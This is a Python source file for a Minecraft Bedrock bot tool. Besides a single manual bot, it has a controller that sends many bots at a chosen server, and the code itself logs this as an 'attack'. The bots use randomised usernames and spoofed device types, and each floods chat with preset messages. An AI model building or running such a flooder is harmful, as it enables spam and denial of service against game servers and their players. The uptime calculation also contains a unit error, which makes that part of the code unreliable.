import asyncio
import json
import random
import string
import time
from typing import Callable, Any
from r_python_bedrock_protocol import Bot, BotConfig, DeviceOS

def generate_random_prefix(length: int = 6) -> str:
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def get_random_device() -> str:
    return random.choice([DeviceOS.WINDOWS, DeviceOS.ANDROID, DeviceOS.IOS, DeviceOS.NINTENDO])

class SingleBotManager:
    def __init__(self):
        self.bot: Bot | None = None
        self.username = ""
        self.connected = False
        self.messages: list[dict] = []
        self._listeners: list[Callable[[str, Any], None]] = []

    def on(self, event_name: str, callback: Callable[[Any], None]):
        self._listeners.append((event_name, callback))

    def _emit(self, event_name: str, data: Any):
        for name, callback in list(self._listeners):
            if name == event_name:
                try:
                    callback(data)
                except Exception:
                    pass

    def get_status(self) -> dict:
        return {
            "connected": self.connected,
            "username": self.username if self.connected else ""
        }

    def get_messages(self, count: int = 100) -> list[dict]:
        return self.messages[-count:]

    def add_message(self, msg_type: str, text: str):
        entry = {
            "type": msg_type,
            "text": text,
            "time": time.strftime("%Y-%m-%dT%H:%M:%S.000Z")
        }
        self.messages.append(entry)
        if len(self.messages) > 200:
            self.messages.pop(0)
        self._emit("message", entry)

    async def connect(self, options: dict):
        if self.connected:
            await self.disconnect()

        host = options.get("host", "127.0.0.1")
        port = int(options.get("port", 19132))
        version = options.get("version", "1.20.80")
        username = options.get("username", "ManualBot")

        self.username = username
        cfg = BotConfig(
            username=username,
            device="windows",
            version=version,
            auto_reconnect=False,
            log_level="ERROR"
        )
        self.bot = Bot(host, port, config=cfg)

        @self.bot.on("connect")
        def on_conn():
            self.connected = True
            self.add_message("chat", f"[System] Connected to {host}:{port}")
            self._emit("status", self.get_status())

        @self.bot.on("join")
        def on_j():
            self.connected = True
            self.add_message("chat", f"[System] Spawned in world as {username}")
            self._emit("status", self.get_status())

        @self.bot.on("text")
        def on_txt(pkt: dict):
            src = pkt.get("source_name", "")
            msg = pkt.get("message", "")
            line = f"<{src}> {msg}" if src else msg
            self.add_message("chat", line)

        @self.bot.on("disconnect")
        def on_disc(reason: str):
            self.connected = False
            self.add_message("chat", f"[System] Disconnected: {reason or 'Server closed'}")
            self._emit("status", self.get_status())

        @self.bot.on("error")
        def on_err(exc: Exception):
            self.add_message("chat", f"[Error] {exc}")

        asyncio.create_task(self.bot.run())

    async def disconnect(self):
        if self.bot:
            try:
                await self.bot.stop()
            except Exception:
                pass
            self.bot = None
        self.connected = False
        self._emit("status", self.get_status())

    async def send_message(self, text: str):
        if self.bot and self.connected:
            if text.startswith("/"):
                self.bot.send_command(text[1:])
            else:
                await self.bot.send_message(text)
            self.add_message("cmd", f"Sent: {text}")

class BotController:
    def __init__(self, config: dict):
        self.config = config
        self.running = False
        self.stats = {
            "totalBots": 0,
            "online": 0,
            "kicked": 0,
            "messagesSent": 0,
            "errors": 0,
            "startTime": None,
            "status": "stopped"
        }
        self.logs: list[dict] = []
        self.max_logs = 500
        self.bots: list[Bot] = []
        self._tasks: list[asyncio.Task] = []
        self._listeners: list[Callable[[str, Any], None]] = []

    def on(self, event_name: str, callback: Callable[[Any], None]):
        self._listeners.append((event_name, callback))

    def _emit(self, event_name: str, data: Any):
        for name, callback in list(self._listeners):
            if name == event_name:
                try:
                    callback(data)
                except Exception:
                    pass

    def add_log(self, log_type: str, message: str):
        entry = {
            "type": log_type,
            "message": message,
            "text": message,
            "time": time.strftime("%Y-%m-%dT%H:%M:%S.000Z")
        }
        self.logs.append(entry)
        if len(self.logs) > self.max_logs:
            self.logs.pop(0)
        self._emit("log", entry)

    def get_status(self) -> dict:
        uptime = (time.time() - self.stats["startTime"] * 1000) if self.stats["startTime"] and self.running else 0
        res = dict(self.stats)
        res["uptime"] = round(uptime)
        return res

    def get_logs(self, count: int = 100) -> list[dict]:
        return self.logs[-count:]

    def start(self, bot_config_data: dict) -> dict:
        if self.running:
            return {"error": "Already running"}

        asyncio.create_task(self._async_start(bot_config_data))
        return {"success": True}

    async def _async_start(self, bot_config_data: dict):
        host = bot_config_data.get("host", "localhost")
        port = int(bot_config_data.get("port", 19132))
        version = bot_config_data.get("version", "1.20.80")
        base_username = bot_config_data.get("baseUsername", "Bot")
        count = int(bot_config_data.get("count", 10))
        delay_sec = float(bot_config_data.get("delayBetweenBotsSeconds", 1.0))
        final_delay_sec = int(bot_config_data.get("finalDelaySeconds", 30))
        messages = bot_config_data.get("messages", ["Hello!"])

        self.bots.clear()
        self._tasks.clear()
        self.stats = {
            "totalBots": count,
            "online": 0,
            "kicked": 0,
            "messagesSent": 0,
            "errors": 0,
            "startTime": time.time(),
            "status": "running"
        }
        self.running = True
        self.add_log("info", f"Started attack on {host}:{port} with {count} bots (v{version})")
        self._emit("update", self.get_status())

        for i in range(count):
            if not self.running:
                break
            prefix = generate_random_prefix(6)
            username = f"{prefix}{base_username}"
            device = get_random_device()

            cfg = BotConfig(
                username=username,
                device=device,
                version=version,
                auto_reconnect=False,
                connect_timeout=10.0,
                log_level="ERROR"
            )

            bot = Bot(host, port, config=cfg)
            self.bots.append(bot)
            self._wire_bot_events(bot, username, messages, final_delay_sec)

            task = asyncio.create_task(bot.run())
            self._tasks.append(task)

            if i < count - 1 and delay_sec > 0:
                await asyncio.sleep(delay_sec)

    def _wire_bot_events(self, bot: Bot, username: str, messages: list[str], final_delay_sec: int):
        @bot.on("connect")
        def on_connect():
            self.add_log("info", f"Bot {username} connected RakNet")

        @bot.on("join")
        async def on_join():
            self.stats["online"] += 1
            self.add_log("success", f"Bot Spawned: {username}")
            self._emit("update", self.get_status())

            for msg in messages:
                if not self.running or not bot.is_connected:
                    break
                await asyncio.sleep(1.0)
                await bot.send_message(msg)
                self.stats["messagesSent"] += 1
                self.add_log("chat", f"[{username}] {msg}")
                self._emit("update", self.get_status())

            if final_delay_sec > 0:
                await asyncio.sleep(final_delay_sec)
                try:
                    await bot.stop()
                except Exception:
                    pass

        @bot.on("disconnect")
        def on_disconnect(reason: str):
            if self.stats["online"] > 0:
                self.stats["online"] -= 1
            self.stats["kicked"] += 1
            self.add_log("warning", f"Bot Kicked: {username}")
            self._emit("update", self.get_status())

        @bot.on("error")
        def on_error(exc: Exception):
            self.stats["errors"] += 1
            self.add_log("error", f"Bot Error {username}: {exc}")
            self._emit("update", self.get_status())

    def stop(self) -> dict:
        if not self.running:
            return {"error": "Not running"}

        asyncio.create_task(self._async_stop())
        return {"success": True}

    async def _async_stop(self):
        self.running = False
        self.add_log("warning", "Stopping all bots...")
        for bot in self.bots:
            try:
                await bot.stop()
            except Exception:
                pass
        for t in self._tasks:
            t.cancel()
        self.bots.clear()
        self._tasks.clear()

        self.stats["status"] = "stopped"
        self.stats["online"] = 0
        self.add_log("info", "Attack stopped")
        self._emit("update", self.get_status())
